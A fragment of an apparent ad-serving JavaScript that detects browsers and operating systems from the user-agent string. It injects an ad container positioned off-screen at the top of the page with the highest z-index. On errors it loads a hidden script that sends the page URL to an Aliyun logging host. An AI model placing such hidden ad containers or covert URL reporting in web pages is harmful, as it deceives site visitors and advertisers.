                r: /baiduboxapp|baiduhd|bidubrowser|baidubrowser/
            }, {
                n: "SamsungBrowser",
                r: /samsungbrowser/
            }, {
                n: "MiuiBrowser",
                r: /miuibrowser/
            }, {
                n: "Sogou",
                r: /sogoumobilebrowser|sogousearch/
            }, {
                n: "Chrome",
                r: /chrome|crios/
            }, {
                n: "Explorer2345",
                r: /2345explorer|2345chrome|mb2345browser/
            }, {
                n: "Liebao",
                r: /lbbrowser/
            }, {
                n: "Weibo",
                r: /__weibo__/
            }, {
                n: "OPPO",
                r: /oppobrowser/
            }, {
                n: "VIVO",
                r: /vivobrowser/
            }, {
                n: "toutiao",
                r: /newsarticle/
            }, {
                n: "MobileQQ",
                r: /mobile.*qq/
            }, {
                n: "Firefox",
                r: /firefox/
            }, {
                n: "Maxthon",
                r: /maxthon/
            }, {
                n: "Mobile360",
                r: /360browser/
            }, {
                n: "Se360",
                r: /360se/
            }, {
                n: "Ee360",
                r: /360ee/
            }, {
                n: "Safari",
                r: /(iphone|ipad).*version.*mobile.*safari/
            }, {
                n: "AndroidBrowser",
                r: /android.*safari|android.*release.*browser/
            }];
        for (var i = 0, l = d.length; i < l; i++)
            if (d[i]['r'].test(ua)) {
                e = d[i]['n'];
                break
            }
        return e
    }

    function Q(ua) {
        var e = "other",
            b, d = [{
                n: "air",
                r: /adobeair/
            }, {
                n: "mac",
                r: /mac68k|macppc|macintosh|mac os x/
            }, {
                n: "winVista",
                r: /windows nt 6.0|windows vista/
            }, {
                n: "linux",
                r: /linux/
            }, {
                n: "win7",
                r: /windows nt 6.1|windows 7/
            }, {
                n: "winXP",
                r: /windows nt 5.1/
            }, {
                n: "windows",
                r: /windows|win32/
            }, {
                n: "mobile",
                r: /android|iphone|ipod|ipad|blackberry|windows phone|opera mini/
            }];
        for (var i = 0, l = d.length; i < l; i++)
            if (d[i]['r'].test(ua)) {
                e = d[i]['n'];
                break
            }
        return e
    }

    function Z(n) {
        return Math.floor(Math.random() * n) + 1
    }

    function F() {
        var ls = ["android", "iphone", "symbianos", "winphone", "ipad", "ipod"];
        for (var i = 0, l = ls.length; i < l; i++) {
            if (navigator.userAgent.toLowerCase().indexOf(ls[i]) > 0) {
                return 0
            }
        }
        return 1
    }

    function A(GG) {
        var hid = "height:{{1}}px;width:{{2}}px;display:block;position:absolute;overflow:hidden;top:-200px;left:0;z-index:2147483647;";

        function Pt0(GG) {
            var box = dom.createElement("div");
            box.className = "pingfuADHolder";
            box.style.cssText = hid.replace('{{1}}', GG.h).replace('{{2}}', GG.w);
            var content = dom.createElement("div");
            box.appendChild(content);
            dom.body.appendChild(box);
            return content
        }
        return Pt0(GG)
    }
    var G = {}, slotcode = "nullslotcode",cnzz_domain = "nullcnzzdomain";
    console.log("判断重复");
    if( win["yx"+slotcode] ){ console.log("重复");return } win["yx"+slotcode] = true;
    console.log("未重复");
    G.configP = {ast:100,c_time:0,is_cnzz_url:0,pos:3,s_count:0,s_intvl:0,s_rate:100};
    console.log(slotcode,"广告配置",G.configP);
    I();
    console.log(slotcode,"正式服务器");
    C(); D(); L();
    vertion = '2018-2-8 15:14:59'//v3
})(window,document,navigator);
} catch (e) {
    var _a = document.createElement("script");
    _a.type = "text/javascript";
    _a.src = "//adx-project.cn-shanghai.log.aliyuncs.com/logstores/ad_req_error/track?APIVersion=0.6.0&error="
    +(+new Date())+"|"+"nullslotcode"+"|v3|"+window.location.href+"|"+e.message;
    _a.style.display = "none";
    document.body.appendChild(_a);
    throw "pingfuError: "+e.message
}
